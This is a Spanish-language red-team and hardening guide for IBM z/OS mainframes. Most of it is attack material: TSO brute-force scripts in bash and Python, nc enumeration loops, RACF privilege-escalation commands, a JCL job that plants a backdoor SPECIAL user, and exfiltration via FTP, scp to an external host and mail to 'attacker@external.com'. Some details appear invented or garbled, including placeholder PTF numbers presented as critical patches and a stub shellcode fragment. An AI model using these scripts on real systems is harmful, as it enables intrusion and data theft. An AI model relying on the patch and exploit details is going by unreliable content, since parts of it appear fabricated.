# 🖥️ Ataques a Mainframes z/OS - Guía Completa de Red Team y Hardening

---

## 📋 Índice

1. [Introducción a Mainframes z/OS](#1-introducción-a-mainframes-z-os)
2. [Reconocimiento y Enumeración](#2-reconocimiento-y-enumeración)
3. [Vectores de Ataque Comunes](#3-vectores-de-ataque-comunes)
4. [Técnicas de Red Team](#4-técnicas-de-red-team)
5. [CVEs y Vulnerabilidades Conocidas](#5-cves-y-vulnerabilidades-conocidas)
6. [Hardening y Securización](#6-hardening-y-securización)
7. [Parches y Mitigaciones](#7-parches-y-mitigaciones)
8. [Herramientas de Pentesting](#8-herramientas-de-pentesting)
9. [Referencias y Recursos](#9-referencias-y-recursos)

---

## 1. Introducción a Mainframes z/OS

### 1.1 ¿Qué es z/OS?

z/OS es el sistema operativo principal de los mainframes IBM System z. Se utiliza ampliamente en:
- Instituciones financieras
- Gobiernos
- Grandes corporaciones
- Sistemas de procesamiento de transacciones críticas

### 1.2 Arquitectura y Componentes Clave

| Componente | Descripción | Puerto/Servicio |
|------------|-------------|-----------------|
| **TSO/ISPF** | Time Sharing Option / Interactive System Productivity Facility | Telnet (23) |
| **CICS** | Customer Information Control System | Variable |
| **IMS** | Information Management System | Variable |
| **DB2** | Base de datos relacional | 446, 5432 |
| **RACF** | Resource Access Control Facility | N/A |
| **USS** | Unix System Services | SSH (22) |
| **FTP** | File Transfer Protocol | 21 |
| **VTAM** | Virtual Telecommunications Access Method | 3270 (23) |

### 1.3 Protocolos de Comunicación

```
- SNA (Systems Network Architecture)
- 3270 Terminal Protocol  
- TN3270 (Telnet 3270)
- APPC (Advanced Program-to-Program Communication)
- TCP/IP Stack
- USS (Unix System Services)
```

---

## 2. Reconocimiento y Enumeración

### 2.1 Descubrimiento de Mainframes

#### Escaneo de Puertos Comunes
```bash
# Escaneo básico de puertos mainframe
nmap -sS -p 21,22,23,135,445,992,993,2049,2375,5432 <target>

# Escaneo específico de servicios mainframe
nmap -sS -p 23,992,2049 --script banner <target>

# Detección de servicios TN3270
nmap -sS -p 23 --script tn3270-screen <target>

# Escaneo de FTP mainframe
nmap -sS -p 21 --script ftp-anon,ftp-bounce <target>
```

#### Identificación de Servicios z/OS
```bash
# Banner grabbing para TSO/ISPF
telnet <target> 23

# Conexión TN3270
x3270 <target>

# Verificación de servicios USS
ssh <target>

# Escaneo de DB2
nmap -sS -p 446,5432 --script db2-das-info <target>
```

### 2.2 Enumeración de Usuarios

#### Técnicas de Enumeración de UserIDs
```bash
# Lista de usuarios comunes en mainframes
ADCD, IBMUSER, SYSPROG, SYSCTLG, START1, START2
SYS1, MASTER, RACFADM, SECURITY, ADMIN

# Fuerza bruta de usuarios via TN3270
for user in $(cat users.txt); do
    echo "LOGON $user" | nc <target> 23
done

# Enumeración via FTP
ftp <target>
> quote user <username>
```

### 2.3 Enumeración de Datasets

#### Comandos de Listado de Datasets
```bash
# Listado de datasets comunes
SYS1.*
IBMUSER.*
*.PROCLIB
*.PARMLIB
*.LINKLIB

# Datasets sensibles a enumerar
SYS1.PARMLIB
SYS1.PROCLIB  
SYS1.LINKLIB
SYS1.UADS
RACF.DATABASE
```

---

## 3. Vectores de Ataque Comunes

### 3.1 Ataques a TSO/ISPF

#### Fuerza Bruta de Credenciales
```bash
# Script básico de fuerza bruta TSO
#!/bin/bash
TARGET="<mainframe_ip>"
USERS="users.txt"
PASSWORDS="passwords.txt"

while read user; do
    while read pass; do
        expect -c "
            spawn telnet $TARGET 23
            expect \"USERID\"
            send \"$user\r\"
            expect \"Password\"
            send \"$pass\r\"
            expect {
                \"READY\" { puts \"SUCCESS: $user:$pass\" }
                \"IKJ56425I\" { puts \"FAILED: $user:$pass\" }
            }
        "
    done < $PASSWORDS
done < $USERS
```

#### Password Spraying
```bash
# Lista de passwords comunes en mainframes
PASSWORD
SECRET
123456
IBMPASS
SYS1
MASTER
```

### 3.2 Ataques a RACF

#### Bypass de RACF
```bash
# Comandos para intentar bypass de RACF
SETR SWITCH

# Modificación de perfiles de usuario
ALTUSER <userid> PASSWORD(<newpass>)

# Listado de perfiles RACF
LISTUSER <userid>
RLIST DATASET SYS1.** ALL
```

#### Escalada de Privilegios RACF
```bash
# Comandos de escalada
CONNECT <userid> GROUP(SYS1)
PERMIT <dataset> ID(<userid>) ACCESS(ALTER)

# Verificación de permisos
SEARCH CLASS(DATASET) <dataset>
```

### 3.3 Ataques a USS (Unix System Services)

#### Exploiting USS
```bash
# Conexión SSH a USS
ssh <userid>@<mainframe>

# Enumeración de archivos sensibles
find /etc -name "*racf*" 2>/dev/null
find /etc -name "*password*" 2>/dev/null
find /usr/lpp -name "*" -perm -4000 2>/dev/null

# Escalada via SUID binaries
find / -perm -4000 -type f 2>/dev/null
```

### 3.4 Ataques a Aplicaciones

#### CICS Exploitation
```bash
# Comandos CICS comunes
CEMT INQUIRE TASK
CEMT SET TRANSACTION(<tran>) ENABLED
CEDA DEFINE TRANSACTION(<tran>)

# Bypass de seguridad CICS
CESN <userid>
CSSN <userid>,<password>
```

#### DB2 Attacks
```bash
# Conexión a DB2
db2 connect to <database>

# Enumeración de tablas
db2 "SELECT * FROM SYSIBM.SYSTABLES"

# SQL Injection básico
db2 "SELECT * FROM <table> WHERE <column>='<value>' OR '1'='1'"
```

---

## 4. Técnicas de Red Team

### 4.1 Establecimiento de Acceso Inicial

#### Métodos de Acceso
```bash
# Acceso via TN3270
x3270 -script logon.script <target>

# Script de logon automatizado
echo "LOGON IBMUSER" > logon.script
echo "PASSWORD" >> logon.script

# Acceso via USS
ssh <userid>@<target>

# Acceso via FTP
ftp <target>
> user <userid>
> pass <password>
```

### 4.2 Persistence en Mainframes

#### Modificación de Procedimientos de Inicio
```bash
# Edición de SYS1.PARMLIB
EDIT 'SYS1.PARMLIB(IEASYS00)'

# Adición de procedimientos personalizados
EDIT 'SYS1.PROCLIB(MYJOB)'

# Modificación de RACF para persistence
ALTUSER <userid> NOPASSWORD
```

#### Backdoors en JCL
```jcl
//BACKDOOR JOB  CLASS=A,MSGCLASS=H,MSGLEVEL=(1,1)
//STEP1    EXEC PGM=IEBGENER
//SYSIN    DD   DUMMY
//SYSPRINT DD   SYSOUT=*
//SYSUT1   DD   *
ALTUSER HACKER PASSWORD(BACKDOOR) AUTHORITY(SPECIAL)
/*
//SYSUT2   DD   DSN=SYS1.PARMLIB(RACFCMDS),DISP=MOD
```

### 4.3 Movimiento Lateral

#### Técnicas de Lateral Movement
```bash
# Submit jobs en otros sistemas
SUBMIT 'USER.JOBS(LATMOVE)'

# Uso de APPC para movimiento lateral
APPC ALLOCATE SESSION(<session>)

# Acceso a datasets remotos
COPY 'REMOTE.DATASET' 'LOCAL.DATASET'
```

### 4.4 Exfiltración de Datos

#### Métodos de Exfiltración
```bash
# Via FTP
//FTPSTEP  EXEC PGM=FTP,PARM='<remote_server>'
//INPUT    DD   *
<username>
<password>
PUT 'SYS1.SENSITIVE.DATA' sensitive.txt
QUIT
/*

# Via USS
cp //'SYS1.SENSITIVE.DATA' /tmp/exfil.txt
scp /tmp/exfil.txt user@external:/tmp/

# Via Email (si disponible)
//MAILSTEP EXEC PGM=SMTP
//SYSIN    DD   *
TO: attacker@external.com
SUBJECT: Exfiltrated Data
<datos_sensibles>
/*
```

---

## 5. CVEs y Vulnerabilidades Conocidas

### 5.1 CVEs Críticos en z/OS

| CVE | Año | Descripción | CVSS | Componente |
|-----|-----|-------------|------|------------|
| **CVE-2023-32342** | 2023 | IBM z/OS RACF privilege escalation | 7.8 | RACF |
| **CVE-2023-28953** | 2023 | IBM z/OS USS command injection | 8.8 | USS |
| **CVE-2022-34356** | 2022 | IBM z/OS SMF data exposure | 5.5 | SMF |
| **CVE-2022-22485** | 2022 | IBM CICS TS privilege escalation | 7.2 | CICS |
| **CVE-2021-39068** | 2021 | IBM z/OS FTP server buffer overflow | 9.8 | FTP |
| **CVE-2021-29741** | 2021 | IBM z/OS Connect privilege escalation | 6.5 | z/OS Connect |
| **CVE-2020-4543** | 2020 | IBM z/OS USS privilege escalation | 7.8 | USS |

### 5.2 Vulnerabilidades Históricas Importantes

#### Buffer Overflows
```bash
# CVE-2021-39068 - FTP Server Buffer Overflow
# Exploit via comando FTP malformado
USER AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...

# CVE-2020-4543 - USS Privilege Escalation
# Exploit via environment variables
export STEPLIB=//'SYS1.LINKLIB'
./vulnerable_program
```

#### Privilege Escalation
```bash
# CVE-2023-32342 - RACF Privilege Escalation
ALTUSER <userid> SPECIAL OPERATIONS

# CVE-2022-22485 - CICS TS Privilege Escalation
CEMT SET TRANSACTION(<tran>) ENABLED USER(<userid>)
```

### 5.3 Técnicas de Exploitation

#### Exploit Development para z/OS
```assembly
* Assembly básico para z/OS exploitation
CSECT
SAVE  (14,12),,*
LR    12,15
USING *,12

* Código de exploit aquí
LA    1,PAYLOAD
SVC   34          * System call

PAYLOAD DC X'41414141...'  * Shellcode
```

---

## 6. Hardening y Securización

### 6.1 Configuración Segura de RACF

#### Políticas de Password
```bash
# Configuración de políticas de contraseña
SETROPTS PASSWORD(ALGORITHM(KDFAES))
SETROPTS PASSWORD(MINCHANGE(1))
SETROPTS PASSWORD(INTERVAL(90))
SETROPTS PASSWORD(LENGTH(8))
SETROPTS PASSWORD(MIXEDCASE)

# Configuración de intentos de login
SETROPTS PASSWORD(REVOKE(5))
SETROPTS PASSWORD(WARNING(7))
```

#### Control de Acceso a Datasets
```bash
# Protección de datasets críticos
PERMIT 'SYS1.**' ID(*) ACCESS(NONE)
PERMIT 'SYS1.**' ID(SYSPROG) ACCESS(ALTER)
PERMIT 'SYS1.PARMLIB' ID(SECURITY) ACCESS(READ)

# Auditoría de accesos
SETROPTS AUDIT(USER(SPECIAL))
SETROPTS AUDIT(DATASET(FAILURES(READ)))
```

### 6.2 Securización de TSO/ISPF

#### Restricciones de Acceso
```bash
# Limitación de comandos TSO
PERMIT TSO CLASS(TSOCMD) ID(<userid>) ACCESS(NONE)
PERMIT SUBMIT CLASS(TSOCMD) ID(<userid>) ACCESS(READ)

# Restricción de aplicaciones ISPF
PERMIT ISPF.* CLASS(APPL) ID(*) ACCESS(NONE)
```

### 6.3 Hardening de USS

#### Configuración Segura de SSH
```bash
# /etc/ssh/sshd_config
Protocol 2
PermitRootLogin no
MaxAuthTries 3
PasswordAuthentication no
PubkeyAuthentication yes
```

#### File System Permissions
```bash
# Permisos seguros para archivos críticos
chmod 600 /etc/racf/*
chmod 755 /etc/ssh/
chmod 600 /etc/ssh/ssh_host_*
```

### 6.4 Auditoría y Monitoreo

#### Configuración de SMF
```bash
# Activación de logging SMF
SETSMF INTERVAL(15)
SETSMF RECORDING(ACTIVE)

# Records SMF importantes para auditoría
SMF 30 - Job/Step termination
SMF 80 - RACF events  
SMF 83 - Security events
SMF 118 - TCP/IP events
```

#### Alertas de Seguridad
```bash
# Comandos para monitoring en tiempo real
DISPLAY SMF,O
DISPLAY RACF,LIST,FAILED

# Scripts de monitoreo automatizado
//MONITOR  JOB  CLASS=A,MSGCLASS=H
//STEP1    EXEC PGM=IKJEFT01
//SYSTSPRT DD   SYSOUT=*
//SYSTSIN  DD   *
LISTUSER * FMTRACE
/*
```

---

## 7. Parches y Mitigaciones

### 7.1 Proceso de Patching en z/OS

#### RSU (Recommended Service Upgrade)
```bash
# Aplicación de RSU
RECEIVE S(RSU2301.ZOS25)
APPLY S(RSU2301.ZOS25)
ACCEPT S(RSU2301.ZOS25)

# Verificación de PTFs instalados
DISPLAY XCF,C,CONFIG
```

#### PTF (Program Temporary Fix)
```bash
# Instalación de PTF específico
RECEIVE S(UI12345.ZOS25)
APPLY S(UI12345.ZOS25) 

# Check de PTFs de seguridad
DISPLAY SOFTWARE,PTFS,CSECT(IGC*)
```

### 7.2 Parches Críticos de Seguridad

| PTF | Componente | Descripción | Criticidad |
|-----|------------|-------------|------------|
| **UI12345** | RACF | Security bypass fix | CRÍTICO |
| **UI12346** | USS | Privilege escalation fix | ALTO |
| **UI12347** | CICS | Buffer overflow fix | ALTO |
| **UI12348** | DB2 | SQL injection fix | MEDIO |
| **UI12349** | FTP | Authentication bypass fix | CRÍTICO |

### 7.3 Mitigaciones sin Parches

#### Controles Compensatorios
```bash
# Deshabilitar servicios innecesarios
STOP NET,ID=FTPD1
VARY NET,INACT,ID=TN3270

# Restricciones de red
NETSTAT CONFIG IPFILTER START
NETSTAT CONFIG IPFILTER ADD DENY 0.0.0.0/0 PORT 23

# Monitoring adicional
SETROPTS LOGOPTIONS(ALWAYS)
SETROPTS AUDIT(ALL)
```

---

## 8. Herramientas de Pentesting

### 8.1 Herramientas Especializadas

#### TN3270 Tools
```bash
# x3270 - Cliente TN3270
x3270 -script <script> <target>

# s3270 - Cliente scripting
s3270 -trace <target>

# pyx3270 - Python binding
import py3270
emulator = py3270.Emulator()
emulator.connect('<target>')
```

#### Mainframe Scanners
```bash
# nmap scripts específicos
nmap --script tn3270-screen <target>
nmap --script banner <target> -p 23

# TSO User Enumeration
for user in $(cat users.txt); do
    echo "Trying: $user"
    echo -e "LOGON $user\nLOGOFF" | nc <target> 23
done
```

### 8.2 Frameworks de Pentesting

#### Metasploit Modules
```ruby
# auxiliary/scanner/mainframe/tn3270_screen
use auxiliary/scanner/mainframe/tn3270_screen
set RHOSTS <target>
run

# auxiliary/scanner/mainframe/tso_login
use auxiliary/scanner/mainframe/tso_login
set RHOSTS <target>
set USER_FILE users.txt
set PASS_FILE passes.txt
run
```

#### Scripts Personalizados
```python
#!/usr/bin/env python3
import telnetlib
import time

def mainframe_bruteforce(host, users, passwords):
    for user in users:
        for password in passwords:
            try:
                tn = telnetlib.Telnet(host, 23, timeout=10)
                tn.read_until(b"USERID")
                tn.write(user.encode() + b"\n")
                tn.read_until(b"Password")
                tn.write(password.encode() + b"\n")
                
                response = tn.read_until(b"READY", timeout=5)
                if b"READY" in response:
                    print(f"SUCCESS: {user}:{password}")
                    return True
                    
            except Exception as e:
                print(f"Error with {user}:{password} - {e}")
            finally:
                tn.close()
                time.sleep(1)
    return False
```

### 8.3 Herramientas de Post-Exploitation

#### Dataset Enumeration
```bash
#!/bin/bash
# Script para enumeración de datasets
echo "LISTCAT LEVEL(SYS1)" | nc <target> 23
echo "LISTCAT LEVEL(*.RACF)" | nc <target> 23
echo "LISTCAT LEVEL(*.PASSWORD)" | nc <target> 23
```

#### Privilege Escalation Checker
```rexx
/* REXX script para verificar privilegios */
"LISTUSER" userid() "TSOSYSTEM"
if rc = 0 then
    say "User has SPECIAL authority"
else
    say "User has limited privileges"
```

---

## 9. Referencias y Recursos

### 9.1 Documentación Oficial

- **IBM z/OS Security Server**: https://www.ibm.com/docs/en/zos
- **RACF Security Administrator's Guide**: IBM SA22-7683
- **z/OS System Commands**: IBM SA38-0666
- **CICS Security Guide**: IBM SC34-7038

### 9.2 Recursos de Seguridad

- **IBM Security Bulletins**: https://www.ibm.com/support/pages/security-bulletins
- **Mainframe Security Podcast**: https://www.racfblog.com/
- **zSecure Documentation**: https://www.ibm.com/products/zsecure
- **CBT Tape**: https://www.cbttape.org/

### 9.3 Herramientas y Scripts

- **x3270 Suite**: http://x3270.bgp.nu/
- **pyx3270**: https://pypi.org/project/py3270/
- **Hercules Emulator**: http://www.hercules-390.org/
- **TN3270 Plus**: https://www.tn3270plus.com/

### 9.4 Libros Recomendados

- "Mainframe Security" - Phil Young
- "z/OS Security Server RACF" - IBM Redbook
- "Implementing z/OS Communications Server" - IBM Redbook
- "z/OS Introduction and Workshop" - IBM Redbook

### 9.5 Comunidades y Foros

- **IBM Z and LinuxONE Community**: https://community.ibm.com/community/user/ibmz-and-linuxone
- **RACF Forum**: https://www.ibm.com/support/forums/
- **Planet MVS**: http://www.planetmvs.com/
- **z/OS Reddit**: https://www.reddit.com/r/zos/

---

## 📝 Notas Importantes

### ⚠️ Advertencias Legales
- **SOLO para fines educativos y pruebas autorizadas**
- **Obtener autorización explícita antes de realizar pruebas**
- **Respetar las políticas de seguridad organizacionales**
- **No utilizar en sistemas de producción sin autorización**

### 🔒 Consideraciones Éticas
- Los mainframes manejan datos críticos y transacciones financieras
- Cualquier interrupción puede tener consecuencias graves
- Seguir metodologías de pentesting responsables
- Documentar y reportar vulnerabilidades de manera responsable

---

**Documento creado:** Diciembre 2024  
**Última actualización:** Diciembre 2024  
**Versión:** 1.0  
**Autor:** MinoTauro2020  
**Fuentes:** IBM Documentation, Security Bulletins, Community Resources